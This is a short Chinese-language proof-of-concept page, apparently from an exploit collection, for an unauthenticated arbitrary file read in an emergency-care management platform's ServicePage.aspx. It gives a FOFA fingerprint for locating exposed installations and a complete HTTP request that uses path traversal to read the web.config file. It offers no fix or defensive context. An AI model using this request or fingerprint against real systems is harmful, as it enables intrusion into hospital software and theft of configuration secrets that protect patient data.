# 急诊综合管理平台ServicePage.aspx任意文件读取漏洞

急诊综合管理平台 ServicePage.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

## fofa

```javascript
body="/emis_lib/js/ThreeExtras.js"
```

## poc

```javascript
GET /dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image-20250103100646017](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501031006091.png)